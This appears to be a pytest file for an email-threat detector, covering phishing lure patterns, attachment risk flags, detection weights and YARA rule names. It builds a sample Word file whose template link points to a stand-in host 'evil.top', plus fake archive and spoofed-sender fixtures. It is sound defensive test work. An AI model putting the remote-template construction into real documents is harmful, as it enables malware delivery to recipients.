"""v2.16 detection quality — signals, weights, attachments, feedback, yara rules."""

from __future__ import annotations

import json
import zipfile
from io import BytesIO
from pathlib import Path

from reliquary.core.attachment_inspector import inspect_bytes
from reliquary.core.calibration import segment_for
from reliquary.core.content_signals import (
    BEC_RE,
    MESSENGER_LURE_RE,
    QR_LURE_RE,
    analyze_content_signals,
)
from reliquary.core.feedback import FeedbackEvent, append_feedback, suggest_weight_overrides
from reliquary.core.lookalike import check_display_name_spoof, load_brands
from reliquary.core.office_extract import detect_office_remote_template
from reliquary.core.pipeline import analyze_file
from reliquary.core.verdict import VerdictConfig

CORPUS = Path(__file__).resolve().parents[1] / "samples" / "corpus"
ROOT = Path(__file__).resolve().parents[1]


def test_messenger_lure_signal() -> None:
    assert MESSENGER_LURE_RE.search("пишите в telegram @payroll_desk")
    assert MESSENGER_LURE_RE.search("Contact me via WhatsApp")
    assert not MESSENGER_LURE_RE.search("Reply to hr@company.local please")
    kinds = {s.kind for s in analyze_content_signals("Write in Telegram @help_desk", "")}
    assert "messenger_lure" in kinds
    # Stricter messenger_only still exists for URL-only cases
    kinds2 = {s.kind for s in analyze_content_signals("только https://t.me/evil_x", "")}
    assert "messenger_only" in kinds2
    r = analyze_file(CORPUS / "suspicious_messenger_lure.eml")
    assert r.verdict is not None
    assert r.verdict.level.value == "suspicious"
    assert "messenger_lure" in (r.content_signals or [])


def test_qr_lure_and_qr_credential() -> None:
    assert QR_LURE_RE.search("Scan the QR code now")
    assert QR_LURE_RE.search("Отсканируйте QR-код")
    assert QR_LURE_RE.search("сканируйте QR")
    kinds = {
        s.kind
        for s in analyze_content_signals(
            "Scan the QR to verify account password login",
            "",
            has_qr=True,
        )
    }
    assert "qr_lure" in kinds
    assert "qr_credential" in kinds
    r = analyze_file(CORPUS / "suspicious_qr_mention.eml")
    assert r.verdict is not None
    assert r.verdict.level.value == "suspicious"
    assert "qr_lure" in (r.content_signals or [])


def test_bec_ru_markers() -> None:
    for phrase in (
        "срочно переведите на карту",
        "реквизиты на карту",
        "изменить платёжные реквизиты",
        "CEO urgent wire transfer",
    ):
        assert BEC_RE.search(phrase), phrase
    for phrase in (
        "счёт фактура во вложении",
        "акт сверки за квартал",
        "р/с 40702810900000001234",
        "письмо от CFO",
        "расчётный счёт открыт",
        "главбух просит оплатить",
        "казначей согласовал",
    ):
        assert BEC_RE.search(phrase) is None, phrase


def test_new_weights_defaults() -> None:
    cfg = VerdictConfig()
    assert cfg.weight_messenger_lure == 12
    assert cfg.weight_qr_lure == 12
    assert cfg.weight_qr_credential == 18
    assert cfg.weight_iso_exe == 16
    assert cfg.weight_office_remote_template == 20
    assert cfg.weight_html_polyglot == 18
    assert cfg.weight_rar_archive == 10
    assert cfg.weight_spf_lookalike == 14
    assert cfg.weight_reply_to_spoof == 10


def test_rar_inventory_scrape() -> None:
    raw = b"Rar!\x1a\x07\x00" + b"\x00" * 20 + b"invoice.pdf.exe\x00nested.eml\x00evil.scr\x00"
    info = inspect_bytes("docs.rar", raw)
    assert "rar_archive" in info.risk_flags
    assert "archive_unlisted" not in info.risk_flags
    assert "archive_dangerous_member" in info.risk_flags
    assert "archive_double_extension" in info.risk_flags
    assert "archive_nested_email" in info.risk_flags
    r = analyze_file(CORPUS / "suspicious_rar_exe_scrape.eml")
    assert any("rar_archive" in (a.risk_flags or []) for a in r.attachments)


def test_iso_contains_exe() -> None:
    raw = b"\x00" * 40 + b"SETUP.EXE;1" + b"\x00payload.dll\x00"
    info = inspect_bytes("disk.iso", raw)
    assert "iso_contains_exe" in info.risk_flags
    r = analyze_file(CORPUS / "suspicious_iso_contains_exe.eml")
    assert any("iso_contains_exe" in (a.risk_flags or []) for a in r.attachments)


def test_html_polyglot() -> None:
    data = b"<!DOCTYPE html><html><body>x</body></html>\n" + b"\x00" * 40 + b"PK\x03\x04zzzz"
    info = inspect_bytes("preview.html", data)
    assert "html_polyglot" in info.risk_flags
    r = analyze_file(CORPUS / "suspicious_html_polyglot.eml")
    assert any("html_polyglot" in (a.risk_flags or []) for a in r.attachments)


def test_office_remote_template() -> None:
    buf = BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr(
            "[Content_Types].xml",
            '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="xml" ContentType="application/xml"/>'
            '<Override PartName="/word/document.xml" '
            'ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
            '<Override PartName="/word/settings.xml" '
            'ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"/>'
            "</Types>",
        )
        zf.writestr(
            "_rels/.rels",
            '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
            'Target="word/document.xml"/></Relationships>',
        )
        zf.writestr(
            "word/document.xml",
            '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
            "<w:body><w:p><w:r><w:t>x</w:t></w:r></w:p></w:body></w:document>",
        )
        zf.writestr(
            "word/settings.xml",
            '<?xml version="1.0"?><w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" '
            'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
            '<w:attachedTemplate r:id="rIdTpl"/></w:settings>',
        )
        zf.writestr(
            "word/_rels/settings.xml.rels",
            '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rIdTpl" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
            'Target="https://evil.top/tpl.dotm" TargetMode="External"/></Relationships>',
        )
    raw = buf.getvalue()
    assert detect_office_remote_template(raw) is True
    info = inspect_bytes("invoice.docx", raw)
    assert "office_remote_template" in info.risk_flags
    r = analyze_file(CORPUS / "suspicious_office_remote_template.eml")
    assert any("office_remote_template" in (a.risk_flags or []) for a in r.attachments)


def test_kz_ua_brands_and_display_spoof() -> None:
    brands = load_brands()
    assert "kaspi.kz" in brands
    assert "privatbank.ua" in brands
    assert "diia.gov.ua" in brands
    hits = check_display_name_spoof("Kaspi Gold <noreply@evil.top>")
    assert hits and hits[0].kind == "display_spoof"
    hits2 = check_display_name_spoof("ПриватБанк <noreply@evil.top>")
    assert hits2 and hits2[0].kind == "display_spoof"
    r = analyze_file(CORPUS / "suspicious_display_spoof_kaspi.eml")
    assert r.verdict is not None
    assert r.verdict.level.value == "malicious"
    r2 = analyze_file(CORPUS / "suspicious_display_spoof_privatbank.eml")
    assert r2.verdict is not None
    assert r2.verdict.level.value == "malicious"


def test_feedback_suggest_weight_overrides(tmp_path: Path, monkeypatch) -> None:
    monkeypatch.setattr("reliquary.core.feedback.app_dir", lambda: tmp_path)
    append_feedback(
        FeedbackEvent(
            kind="fn",
            expected_level="suspicious",
            observed_level="benign",
            score=5,
            source_path="a.eml",
            segment="messenger_lure",
        )
    )
    append_feedback(
        FeedbackEvent(
            kind="fp",
            expected_level="benign",
            observed_level="suspicious",
            score=40,
            source_path="b.eml",
            segment="html_polyglot",
        )
    )
    sug = suggest_weight_overrides()
    assert sug.get("weight_messenger_lure") == 2
    assert sug.get("weight_html_polyglot") == -2


def test_yara_rules_file_exists() -> None:
    rules = ROOT / "yara_rules" / "default.yar"
    assert rules.is_file()
    text = rules.read_text(encoding="utf-8")
    for name in (
        "html_smuggling",
        "lnk_cmd",
        "js_wscript",
        "vbs_createobject",
        "onenote_embedded",
        "pdf_js_action",
        "svg_onload",
        "hta_script",
        "excel_dde",
        "ole_package",
        "qr_data_url",
        "encoded_powershell",
    ):
        assert f"rule {name}" in text


def test_calibration_segments_v216() -> None:
    r = analyze_file(CORPUS / "suspicious_messenger_lure.eml")
    assert segment_for(r) == "messenger_lure"
    r2 = analyze_file(CORPUS / "suspicious_qr_mention.eml")
    assert segment_for(r2) == "qr_lure"
    r3 = analyze_file(CORPUS / "suspicious_html_polyglot.eml")
    assert segment_for(r3) == "html_polyglot"
    r4 = analyze_file(CORPUS / "suspicious_office_remote_template.eml")
    assert segment_for(r4) == "remote_template"
    r5 = analyze_file(CORPUS / "suspicious_rar_exe_scrape.eml")
    assert segment_for(r5) == "rar"
    r6 = analyze_file(CORPUS / "suspicious_iso_contains_exe.eml")
    assert segment_for(r6) == "iso_exe"


def test_one_hop_received_is_medium() -> None:
    r = analyze_file(CORPUS / "unknown_short_received.eml")
    assert any(
        h.name == "Received" and h.severity.value == "medium" for h in r.headers
    )


def test_schema_has_v216_weights() -> None:
    schema = json.loads((ROOT / "docs" / "verdict_extra.schema.json").read_text(encoding="utf-8"))
    props = schema["properties"]
    for key in (
        "weight_messenger_lure",
        "weight_qr_lure",
        "weight_qr_credential",
        "weight_iso_exe",
        "weight_office_remote_template",
        "weight_html_polyglot",
        "weight_rar_archive",
        "weight_spf_lookalike",
        "weight_reply_to_spoof",
    ):
        assert key in props
